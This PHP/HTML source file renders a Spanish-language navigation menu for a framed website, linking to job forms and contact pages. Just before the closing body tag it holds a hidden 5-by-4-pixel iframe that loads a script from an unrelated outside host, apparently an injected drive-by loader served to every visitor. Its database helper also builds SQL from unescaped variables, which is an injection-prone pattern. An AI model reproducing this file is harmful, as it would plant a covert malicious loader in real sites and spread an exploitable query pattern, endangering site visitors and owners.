<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];
	if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }
	
?>
<HTML>
<HEAD><TITLE>Menú de navegación estilo árbol</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}

function cambiarsub(pais) {
	parent.frames['centro'].location='<?=CFG_virtualPath?>formulario_empleo.php?pais='+pais
	parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=3&menu=0&pais='+pais;

}


</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"  height="19"><small>&nbsp;</small></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td >

<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
    <td><a class="link1" id="xuno" href="javascript:cambiarsub('ar')"><?=traducemenu(177)?></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
  <!--	<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->

	<td><a class="link1" id="xdos" href="http://www.scbf.com.br/oport.php" target="_top"><?=traducemenu(178)?></a></td>
  </tr>
</table>
<table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
  <tr>
	<!--<td width="1"><img src="../images/flechaitemmunozover2.gif" border="0"></td>-->
		<?if ($lng=="esp"){?>
	<td><a  class="link1"id="xtres" href="http://www.ahjc.cl/contacto.php" target="_top"><?=traducemenu(179)?></a></td>
		<?}else {?>
	<td><a  class="link1"id="xtres" href="http://www.ahjc.cl/eng/contacto.php" target="_top"><?=traducemenu(179)?></a></td>
				 <?}?>
  </tr>
</table>
</td></tr></table>
<script>
//120
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=122&tit=<?=traducemenu(122)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=122';

</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>
<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>

